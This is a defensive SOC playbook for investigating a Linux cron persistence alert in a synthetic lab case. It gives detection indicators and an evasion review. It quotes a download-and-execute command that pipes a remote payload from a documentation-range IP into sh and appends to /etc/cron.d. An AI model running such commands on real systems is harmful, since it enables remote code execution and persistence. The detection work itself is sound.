# PB-007 — Linux Security Event

## 1. Purpose

PB-007 provides a structured Security Operations Center investigation and response workflow for suspicious Linux security events, with primary coverage for `DET-LINUX-001` — Suspicious Linux Cron Persistence Detection.

The playbook converts a Linux persistence alert into a controlled sequence of alert validation, evidence preservation, host and user attribution, cron persistence analysis, command-line investigation, timeline reconstruction, indicator validation, threat-intelligence review, MITRE ATT&CK mapping, containment assessment, eradication, recovery, detection validation, and detection-engineering feedback.

The workflow is designed for synthetic laboratory telemetry and authorized defensive investigation.

It does not represent production SOC activity, real-world incident response, or independently verified compromise.

---

## 2. Scope

This playbook covers Linux security events involving suspicious scheduled-task or cron persistence indicators.

**Primary detection**

`DET-LINUX-001`

**Detection name**

`Suspicious Linux Cron Persistence Detection`

**Detection version**

`1.0`

**Related flagship investigation**

`CASE-009`

---

## 3. Laboratory Boundary

This playbook is intended for a controlled cybersecurity laboratory.

Telemetry must be:

* synthetic;
* authorized;
* non-production;
* free of real credentials;
* free of unnecessary personally identifiable information;
* suitable for defensive analysis.

No laboratory result should be presented as evidence of real-world professional SOC employment or a production security incident.

---

## 4. Detection Trigger

`DET-LINUX-001` evaluates events where:

```text
event_type == "linux_persistence"
```

and:

```text
status == "success"
```

The detector evaluates multiple Linux persistence indicators.

An alert is generated when at least two indicators are present.

Configured threshold:

```text
LINUX_001_MIN_INDICATORS = 2
```

---

## 5. Detection Indicators

The detector currently recognizes the following indicators.

### 5.1 Cron persistence path

The event file path begins with one of:

```text
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/var/spool/cron/
/var/spool/cron/crontabs/
```

Indicator:

`cron_persistence_path`

### 5.2 Suspicious cron command

The command line contains patterns involving:

```text
| crontab
crontab <
crontab -
```

while excluding:

```text
crontab -e
```

Indicator:

`suspicious_cron_command`

### 5.3 Shell download and execution

The detector identifies command lines containing:

* `curl` or `wget`;
* together with `| sh` or `| bash`.

Indicator:

`shell_download_execution`

This combination is treated as suspicious because a remote resource is being retrieved and directly passed to a shell interpreter.

The indicator alone does not prove that the downloaded content was malicious.

### 5.4 Hidden or temporary payload

The detector identifies command lines referencing:

```text
/tmp/
/var/tmp/
/dev/shm/
```

or metadata containing:

```text
hidden_payload == true
```

Indicator:

`hidden_or_tmp_payload`

---

## 6. Alert Generation Threshold

The detector requires:

```text
indicator_count >= 2
```

Events containing fewer than two recognized indicators are not promoted to `DET-LINUX-001` alerts.

Analysts must therefore distinguish between:

* an event containing one suspicious characteristic;
* an event containing multiple detection indicators;
* a generated detection alert;
* independently verified malicious activity.

These are not equivalent.

---

## 7. CASE-009 Laboratory Evidence

CASE-009 generated the following alert:

```text
ALERT-CASE-009-DET-LINUX-001-EVT-009001
```

Detection:

```text
DET-LINUX-001
```

Severity:

```text
high
```

Confidence:

```text
high
```

Supporting event:

```text
EVT-009001
```

Timestamp:

```text
2026-09-09T13:00:00Z
```

Host:

```text
lab-linux-02
```

User:

```text
analyst
```

Process:

```text
bash
```

File path:

```text
/etc/cron.d/system-update
```

Observed command:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

Observed indicators:

* `cron_persistence_path`
* `shell_download_execution`
* `hidden_or_tmp_payload`

Indicator count:

```text
3
```

ATT&CK mapping:

```text
T1053.003 — Cron
```

---

## 8. Initial Analyst Position

The initial analyst position should be:

> Observed multiple indicators are consistent with suspicious Linux cron persistence activity. The detection supports investigation of scheduled task persistence but does not independently prove compromise or successful persistence.

This distinction must remain throughout the investigation.

Do not automatically convert:

```text
suspicious persistence
```

into:

```text
confirmed compromise
```

without additional evidence.

---

## 9. Alert Validation

Before beginning substantive investigation, validate:

* alert ID;
* detection ID;
* detection name;
* detection version;
* alert status;
* severity;
* confidence;
* timestamp;
* host;
* user;
* process;
* command line;
* file path;
* indicator count;
* indicators;
* supporting event IDs;
* ATT&CK mapping;
* analyst interpretation.

Confirm that the alert is structurally complete.

---

## 10. Evidence Classification

Classify evidence before interpretation.

### Observed evidence

Examples:

* timestamp;
* hostname;
* username;
* process;
* command line;
* file path;
* supporting event ID;
* detection indicators;
* generated alert metadata.

### Analyst interpretation

Examples:

* likely persistence attempt;
* suspicious administrative activity;
* possible payload execution;
* possible attacker-controlled scheduled task.

### Hypothesis

Examples:

* an attacker may have established persistence;
* the downloaded payload may have been malicious;
* the account may have been compromised;
* the host may have been previously accessed.

Hypotheses require supporting evidence.

---

## 11. Data Quality Validation

Validate that required Linux telemetry fields exist:

```text
event_id
timestamp
event_type
source
host
user
action
status
process
command_line
file_path
metadata
```

Confirm:

* timestamp is parseable;
* event ID is present;
* host is present;
* user is present;
* command line is preserved;
* file path is preserved;
* metadata is structurally valid;
* event status is valid;
* event type is `linux_persistence`.

Do not silently repair missing security evidence.

---

## 12. Timestamp Validation

Preserve the original timestamp.

Check:

* timezone;
* ordering relative to related events;
* impossible future timestamps;
* duplicated timestamps;
* timestamp inconsistencies;
* suspicious timestamp manipulation.

If timestamp reliability is uncertain, document the limitation.

Do not fabricate a corrected timestamp.

---

## 13. Host Attribution

Record the affected host.

CASE-009:

```text
lab-linux-02
```

Determine:

* whether the host is a laboratory system;
* whether the host is expected to run cron;
* whether the affected cron location is legitimate;
* whether the host has related alerts;
* whether the same activity appears on other hosts.

Host attribution must be based on telemetry.

---

## 14. User Attribution

CASE-009 user:

```text
analyst
```

Determine:

* whether the account is authorized;
* whether the account normally administers the host;
* whether the observed action is consistent with the user's expected role;
* whether authentication activity preceded the event;
* whether the account appears in other suspicious events.

A valid username does not establish malicious intent.

---

## 15. Process Analysis

CASE-009 process:

```text
bash
```

Investigate:

* parent process if available;
* process execution time;
* process ancestry;
* command interpreter;
* associated child processes;
* execution user;
* process persistence;
* related endpoint telemetry.

A shell process is not inherently malicious.

The analyst must evaluate the complete execution context.

---

## 16. Command-Line Preservation

Preserve the original command line exactly.

CASE-009:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

Do not normalize away meaningful characters.

Pay attention to:

* shell operators;
* pipes;
* redirects;
* command substitution;
* encoded content;
* download utilities;
* interpreter invocation;
* temporary directories;
* cron locations.

---

## 17. Cron Persistence Analysis

Determine whether the referenced cron location is:

* a system cron directory;
* a user crontab;
* a scheduled task;
* an expected administrative configuration;
* a newly created or modified entry.

Relevant locations include:

```text
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/var/spool/cron/
/var/spool/cron/crontabs/
```

Record:

* exact file path;
* owner if available;
* permissions if available;
* creation time if available;
* modification time if available;
* file contents if authorized;
* associated process;
* associated user;
* related file-integrity telemetry.

---

## 18. Download-and-Execute Analysis

The CASE-009 command contains:

```text
curl
```

and:

```text
| sh
```

This satisfies the detector's:

```text
shell_download_execution
```

indicator.

Investigate:

* destination;
* URL;
* hostname;
* resolved IP if available;
* protocol;
* retrieved filename;
* downloaded file hash;
* process execution;
* subsequent child processes;
* network activity;
* persistence relationship.

Do not execute an unknown payload merely to determine whether it is malicious.

---

## 19. Payload Analysis

If a downloaded file is preserved in the laboratory:

Record:

* SHA-256;
* file type;
* size;
* entropy;
* strings;
* embedded URLs;
* embedded IP addresses;
* shell commands;
* persistence mechanisms;
* YARA results;
* static-analysis results;
* sandbox results where authorized.

Maintain evidence provenance.

---

## 20. Temporary and Hidden Locations

Investigate references to:

```text
/tmp/
/var/tmp/
/dev/shm/
```

Also evaluate metadata indicating:

```text
hidden_payload
```

Temporary locations can be legitimate.

Their presence should increase investigative attention only when supported by additional context.

---

## 21. File Evidence

Where authorized, preserve:

* cron file;
* downloaded payload;
* related scripts;
* file metadata;
* hashes;
* ownership;
* permissions;
* modification timestamps.

Preserve before destructive containment actions where operationally safe.

---

## 22. Evidence Integrity

For preserved files:

1. acquire the evidence;
2. calculate a cryptographic hash;
3. record the hash;
4. preserve the original;
5. analyze a working copy where possible.

Recommended laboratory hash:

```text
SHA-256
```

Do not overwrite original evidence during analysis.

---

## 23. Timeline Reconstruction

Build a chronological timeline containing:

* authentication;
* session creation;
* command execution;
* download activity;
* file creation;
* cron modification;
* persistence execution;
* network connections;
* related endpoint activity;
* subsequent scheduled execution.

Use original timestamps whenever possible.

---

## 24. Authentication Correlation

Search for preceding authentication events involving the same:

* host;
* user;
* source address;
* session;
* time window.

Relevant detections may include:

```text
DET-AUTH-001
DET-AUTH-002
DET-AUTH-003
```

A preceding successful authentication can strengthen the investigation.

It does not by itself establish that the subsequent persistence activity was malicious.

---

## 25. Privileged Session Correlation

Where available, correlate:

* session IDs;
* login events;
* privilege changes;
* `sudo`;
* `su`;
* administrative commands;
* shell execution.

If no session relationship exists in telemetry, document that limitation.

---

## 26. Endpoint Correlation

Search for related endpoint activity involving:

* shell execution;
* script execution;
* process creation;
* file creation;
* file modification;
* downloaded files;
* command interpreters.

Relevant detection:

```text
DET-ENDPOINT-001
```

Correlation must use a defensible host/user/time relationship.

---

## 27. Malware Correlation

Where applicable, correlate with:

```text
DET-MALWARE-001
```

Evaluate:

* file hashes;
* malware-analysis results;
* YARA matches;
* suspicious execution;
* process behavior;
* network indicators.

A suspicious cron entry should not automatically be classified as malware.

---

## 28. Network Correlation

Investigate network activity associated with:

```text
203.0.113.80
```

in the CASE-009 laboratory scenario.

Record:

* destination;
* timestamp;
* protocol;
* port;
* DNS information;
* process attribution;
* connection frequency;
* related hosts.

The address is used as documentation/test-space telemetry in the laboratory scenario.

Do not represent laboratory addresses as real threat-intelligence findings.

---

## 29. Indicator Extraction

Potential indicators include:

* file paths;
* URLs;
* IP addresses;
* filenames;
* hashes;
* usernames;
* hostnames;
* process names;
* command fragments;
* cron entries.

Each indicator must be classified and validated before being treated as actionable intelligence.

---

## 30. Indicator Validation

For each indicator record:

```text
indicator
type
source
first_seen
last_seen
context
confidence
```

Distinguish:

* observed indicator;
* derived indicator;
* analyst hypothesis.

Do not promote an inferred value to observed evidence.

---

## 31. Threat Intelligence Boundaries

Threat intelligence may be used to enrich an investigation.

Possible enrichment targets include:

* IP reputation;
* domain reputation;
* URL reputation;
* malware hashes;
* known malicious infrastructure;
* known malware families.

External reputation does not replace local evidence.

A reputation result must not be treated as proof that the laboratory event was malicious.

---

## 32. MITRE ATT&CK Mapping

Primary mapping:

```text
T1053.003 — Cron
```

Tactic:

```text
Persistence
```

Additional mappings should only be added when supporting telemetry exists.

Potential contextual mappings may include:

* command and scripting interpreter techniques;
* ingress tool transfer;
* execution techniques.

Do not map techniques solely because a command looks suspicious.

---

## 33. False-Positive Analysis

Potential legitimate explanations include:

* system administration;
* scheduled maintenance;
* software installation;
* configuration management;
* monitoring agents;
* deployment automation;
* backup jobs;
* authorized scripts;
* package management;
* operational automation.

Ask:

1. Was the change authorized?
2. Is the cron path expected?
3. Is the command expected?
4. Is the user authorized?
5. Is the source expected?
6. Is the timing normal?
7. Does the command retrieve external content?
8. Does related telemetry support malicious behavior?

---

## 34. Severity Assessment

The detection defaults to:

```text
high
```

Severity should remain evidence-driven.

Factors increasing concern:

* unauthorized persistence;
* privileged execution;
* external payload retrieval;
* shell execution;
* hidden or temporary payload;
* suspicious network infrastructure;
* related authentication anomalies;
* malware evidence;
* repeated persistence;
* multiple affected hosts.

Factors reducing concern:

* verified maintenance;
* approved deployment;
* known automation;
* expected administrator activity;
* benign payload;
* documented change request.

---

## 35. Confidence Assessment

The detector produces:

```text
high
```

confidence when the indicator threshold is met.

Analyst confidence must nevertheless consider:

* evidence quality;
* attribution;
* authorization;
* related telemetry;
* false-positive explanations;
* timeline consistency;
* evidence integrity.

Detection confidence and analyst conclusion are separate concepts.

---

## 36. Containment Assessment

Containment decisions should be based on evidence and operational context.

Potential laboratory actions include:

* isolate the host;
* disable the affected account;
* terminate suspicious sessions;
* remove unauthorized cron entries;
* block known malicious destinations;
* preserve evidence before removal.

In production environments, containment requires authorization and change control.

---

## 37. Account Response

If account misuse is suspected:

* validate account ownership;
* review authentication history;
* review recent sessions;
* review privilege use;
* rotate credentials where authorized;
* revoke active sessions where appropriate;
* review related hosts.

Do not assume that the presence of a username proves account compromise.

---

## 38. Session Response

Where suspicious sessions are identified:

* record the session;
* preserve relevant evidence;
* identify source;
* determine privilege level;
* assess whether termination is appropriate.

Record containment actions and timestamps.

---

## 39. Persistence Eradication

After evidence preservation and authorization:

* remove unauthorized cron entries;
* remove associated malicious scripts;
* remove unauthorized downloaded payloads;
* restore expected configuration;
* verify scheduled-task state;
* verify file integrity.

Eradication must not destroy evidence required for investigation.

---

## 40. Recovery

Recovery should include:

* restoring known-good configuration;
* validating cron configuration;
* validating affected files;
* confirming expected scheduled tasks;
* checking authentication;
* checking endpoint activity;
* monitoring subsequent execution.

Recovery is complete only when expected system behavior is demonstrated.

---

## 41. Post-Recovery Monitoring

Monitor for:

* recreation of cron entries;
* repeated download-and-execute activity;
* new temporary payloads;
* suspicious shell commands;
* authentication anomalies;
* network callbacks;
* related persistence mechanisms.

Repeated activity may indicate incomplete eradication.

---

## 42. Adversarial Review

Analysts should consider how the detection could be evaded.

Potential evasion techniques include:

* use of legitimate cron paths;
* user crontab instead of `/etc/cron.d/`;
* indirect shell execution;
* alternate download utilities;
* encoded commands;
* DNS-based retrieval;
* local payload staging;
* delayed execution;
* command fragmentation;
* modification of existing legitimate cron entries;
* deletion of evidence;
* timestamp manipulation;
* activity distributed across hosts.

Each limitation should be documented rather than hidden.

---

## 43. Detection Limitations

Current `DET-LINUX-001` has several important boundaries.

It is indicator-based.

It requires at least two indicators.

It evaluates the event fields available to the detector.

It does not independently prove:

* malicious intent;
* compromise;
* successful persistence;
* payload execution;
* attacker identity.

It may miss:

* single-indicator activity;
* novel persistence mechanisms;
* alternate scheduled-task mechanisms;
* obfuscated commands;
* activity outside recognized paths;
* distributed low-volume behavior.

---

## 44. Detection Feedback

Investigation findings should feed back into detection engineering.

Examples:

```text
Investigation weakness
        ↓
Detection limitation
        ↓
Engineering improvement
        ↓
New validation test
        ↓
Detection regression test
        ↓
Security validation
```

Potential improvements include:

* broader Linux persistence coverage;
* normalized command analysis;
* additional cron semantics;
* parent/child process correlation;
* file-integrity correlation;
* network correlation;
* duplicate suppression;
* stronger event provenance;
* configurable indicator thresholds.

---

## 45. Hunting Workflow

When `DET-LINUX-001` fires, hunt for:

* the same cron path on other hosts;
* the same URL;
* the same IP;
* the same command pattern;
* the same payload filename;
* the same user;
* the same process;
* similar temporary-file activity;
* similar authentication sequences.

Hunting results must be recorded as observed findings or hypotheses.

---

## 46. Cross-Project Correlation

Where appropriate, correlate the SOC laboratory with:

* `cybernova-malware-analysis-sandbox`;
* `cybernova-threat-hunting-toolkit`;
* SIEM detection laboratory;
* Linux security audit tooling;
* network-security projects.

Cross-project results should strengthen evidence rather than manufacture certainty.

---

## 47. Evidence Package

A completed investigation should preserve:

```text
alert.json
investigation.md
timeline.md
indicators.md
threat-intelligence.md
hunting.md
response.md
final-report.md
lessons-learned.md
```

Additional evidence may include:

* preserved cron files;
* hashes;
* command output;
* screenshots;
* detection test results;
* relevant telemetry.

---

## 48. Escalation Criteria

Escalate when evidence indicates:

* unauthorized persistence;
* privileged persistence;
* confirmed malicious payload;
* repeated persistence;
* multiple affected hosts;
* suspicious authentication preceding persistence;
* malware evidence;
* confirmed command execution;
* significant business impact;
* inability to determine scope.

Escalation decisions must be evidence-based.

---

## 49. Closure Criteria

Close the investigation only when:

* the alert has been validated;
* evidence has been preserved;
* timeline has been reconstructed;
* indicators have been reviewed;
* false positives have been assessed;
* ATT&CK mapping has been validated;
* containment has been addressed;
* eradication has been completed where required;
* recovery has been validated;
* detection feedback has been recorded;
* limitations are documented;
* the final report is complete.

---

## 50. CASE-009 Reference

CASE-009 demonstrates the current laboratory implementation.

Observed event:

```text
EVT-009001
```

Observed host:

```text
lab-linux-02
```

Observed user:

```text
analyst
```

Observed process:

```text
bash
```

Observed file:

```text
/etc/cron.d/system-update
```

Observed command:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

Observed indicators:

```text
cron_persistence_path
shell_download_execution
hidden_or_tmp_payload
```

Detection:

```text
DET-LINUX-001
```

ATT&CK:

```text
T1053.003
```

The evidence supports investigation of suspicious cron persistence.

It does not independently establish compromise.

---

## 51. Analyst Checklist

### Alert validation

* [ ] Alert ID validated
* [ ] Detection ID validated
* [ ] Detection version validated
* [ ] Severity validated
* [ ] Confidence validated
* [ ] Timestamp validated
* [ ] Supporting event validated

### Linux investigation

* [ ] Host identified
* [ ] User identified
* [ ] Process identified
* [ ] Command line preserved
* [ ] Cron path identified
* [ ] Cron configuration reviewed
* [ ] File evidence preserved
* [ ] Payload evidence preserved
* [ ] Download activity investigated

### Correlation

* [ ] Authentication reviewed
* [ ] Session activity reviewed
* [ ] Endpoint activity reviewed
* [ ] Network activity reviewed
* [ ] Malware evidence reviewed
* [ ] File-integrity activity reviewed
* [ ] Related persistence reviewed

### Analysis

* [ ] Timeline reconstructed
* [ ] Indicators extracted
* [ ] Indicators validated
* [ ] Threat intelligence boundaries documented
* [ ] ATT&CK mapping validated
* [ ] False positives assessed
* [ ] Evasion limitations assessed

### Response

* [ ] Containment assessed
* [ ] Evidence preserved
* [ ] Unauthorized persistence removed where appropriate
* [ ] Recovery validated
* [ ] Post-recovery monitoring defined

### Closure

* [ ] Final report complete
* [ ] Lessons learned recorded
* [ ] Detection feedback recorded
* [ ] Laboratory limitations documented
* [ ] Evidence package complete

---

## 52. Laboratory Validation Standard

PB-007 should be validated against:

* valid Linux persistence telemetry;
* one-indicator events;
* multi-indicator events;
* malformed telemetry;
* missing required fields;
* invalid timestamps;
* alternate cron paths;
* legitimate `crontab -e`;
* curl download-and-execute;
* wget download-and-execute;
* temporary-path activity;
* hidden-payload metadata;
* duplicate events;
* multiple users;
* multiple hosts;
* benign administrative activity;
* command variation;
* timestamp manipulation;
* evidence deletion scenarios.

---

## 53. Engineering Validation

Before release, validate:

```text
pytest
```

```text
ruff check .
```

```text
bandit -r .
```

```text
mypy .
```

```text
pip-audit
```

```text
python -m compileall .
```

```text
git diff --check
```

Only report results that were actually executed.

---

## 54. Portfolio Evidence

PB-007 demonstrates practical capability in:

* Linux security monitoring;
* persistence detection;
* SOC alert triage;
* evidence preservation;
* command-line analysis;
* scheduled-task investigation;
* timeline reconstruction;
* indicator analysis;
* threat-intelligence boundaries;
* MITRE ATT&CK mapping;
* incident-response reasoning;
* adversarial detection review;
* detection-engineering feedback.

These capabilities are demonstrated through the laboratory implementation and must not be represented as professional production SOC experience.

---

## 55. Final Analyst Statement

The analyst should conclude with an evidence-based statement.

Example:

> The laboratory telemetry generated a high-confidence `DET-LINUX-001` alert after multiple indicators associated with Linux cron persistence were observed. The evidence supports investigation of suspicious scheduled-task activity and includes a cron persistence path and shell download-and-execute behavior. The available telemetry does not independently prove compromise, malicious intent, or successful persistence. Additional authentication, endpoint, network, file, and payload evidence should be evaluated before reaching a stronger conclusion.

---

## 56. Limitations

This playbook is a controlled SOC laboratory artifact.

It does not claim:

* production deployment;
* real customer incidents;
* professional SOC employment;
* real-world threat attribution;
* confirmed compromise from synthetic telemetry;
* complete Linux persistence coverage.

All conclusions must remain proportional to the available evidence.

---

## 57. Completion Standard

PB-007 is complete when:

1. the playbook reflects the implemented `DET-LINUX-001` logic;
2. CASE-009 evidence is accurately represented;
3. investigation and response procedures are documented;
4. evidence classification is explicit;
5. ATT&CK mapping is documented;
6. false-positive handling is documented;
7. adversarial limitations are documented;
8. detection feedback is documented;
9. laboratory boundaries are explicit;
10. the playbook passes repository quality checks.

---

## 58. Author

**Ibrahim Mukhtar Saidu**

CYBERNOVA SOC Operations Laboratory

Defensive cybersecurity research and SOC engineering portfolio.
